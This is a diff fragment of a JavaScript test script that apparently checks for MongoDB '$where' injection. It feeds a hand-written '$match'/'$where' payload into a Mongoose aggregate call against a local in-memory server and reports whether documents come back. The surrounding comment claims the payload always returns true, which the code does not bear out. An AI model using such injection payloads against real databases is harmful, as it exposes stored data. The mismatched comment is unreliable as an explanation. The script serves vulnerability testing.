+  // that will be executed on the server. In this case, the function will always return true, so all documents
+  // will be returned.
+  const maliciousPayload = `{ "$match": { "$where": "this.secret === 'secret'" } }`;
+
+  try {
+    const result = await MyModel.aggregate([JSON.parse(maliciousPayload)]);
+    console.log('Vulnerability exploited or not! Query returned:', result);
+    if(result.length > 0) {
+      console.log('The vulnerability is present.');
+    } else {
+      console.log('The vulnerability is not present.');
+    }
+  } catch (error) {
+    console.error('Error during aggregation:', error);
+  } finally {
+    await mongoose.disconnect();
+    await mongod.stop();
+  }
+}
